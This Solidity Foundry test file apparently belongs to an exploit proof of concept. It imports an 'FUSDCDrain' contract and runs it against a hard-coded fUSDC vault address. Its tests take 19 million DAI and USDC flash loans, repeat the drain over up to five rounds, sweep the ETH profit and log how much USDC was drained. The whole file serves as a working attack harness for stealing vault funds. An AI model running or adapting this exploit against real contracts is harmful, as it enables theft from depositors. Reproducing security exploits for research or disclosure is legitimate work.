// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "../exploit/FUSDCDrain.sol";

interface IHVaultView {
    function underlyingBalanceWithInvestment() external view returns (uint256);
}

contract TestFUSDCDrain is Test {
    address constant FUSDC = 0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE;

    function testExecute10() public {
        FUSDCDrain drainer = new FUSDCDrain();

        uint256 vaultBefore = IHVaultView(FUSDC).underlyingBalanceWithInvestment();
        emit log_named_uint("Vault USDC before", vaultBefore);

        // 19M DAI flash, 19M USDC flash, 10 iterations
        drainer.execute(19_000_000e18, 19_000_000e6, 10);
        drainer.sweep();

        uint256 ethProfit = address(this).balance;
        uint256 vaultAfter = IHVaultView(FUSDC).underlyingBalanceWithInvestment();

        emit log_named_uint("ETH profit (wei)", ethProfit);
        emit log_named_uint("Vault after", vaultAfter);
        emit log_named_int("Vault drained USDC", int256(vaultBefore) - int256(vaultAfter));
    }

    function testExecute1() public {
        FUSDCDrain drainer = new FUSDCDrain();

        uint256 vaultBefore = IHVaultView(FUSDC).underlyingBalanceWithInvestment();
        emit log_named_uint("Vault USDC before", vaultBefore);

        drainer.execute(19_000_000e18, 19_000_000e6, 1);
        drainer.sweep();

        uint256 ethProfit = address(this).balance;
        uint256 vaultAfter = IHVaultView(FUSDC).underlyingBalanceWithInvestment();

        emit log_named_uint("ETH profit (wei)", ethProfit);
        emit log_named_uint("Vault after", vaultAfter);
        emit log_named_int("Vault drained USDC", int256(vaultBefore) - int256(vaultAfter));
    }

    function testMultiExecute() public {
        FUSDCDrain drainer = new FUSDCDrain();

        uint256 vaultBefore = IHVaultView(FUSDC).underlyingBalanceWithInvestment();
        emit log_named_uint("Vault USDC before", vaultBefore);

        // Do 5 rounds of execute(10) to drain 5M USDC total
        for (uint256 r = 0; r < 5; r++) {
            drainer.execute(19_000_000e18, 19_000_000e6, 10);
            uint256 vaultNow = IHVaultView(FUSDC).underlyingBalanceWithInvestment();
            emit log_named_uint("After round", r);
            emit log_named_uint("Vault", vaultNow);
        }

        drainer.sweep();

        uint256 ethProfit = address(this).balance;
        uint256 vaultAfter = IHVaultView(FUSDC).underlyingBalanceWithInvestment();

        emit log_named_uint("Total ETH profit (wei)", ethProfit);
        emit log_named_uint("Vault final", vaultAfter);
        emit log_named_int("Total vault drained USDC", int256(vaultBefore) - int256(vaultAfter));
    }

    receive() external payable {}
}
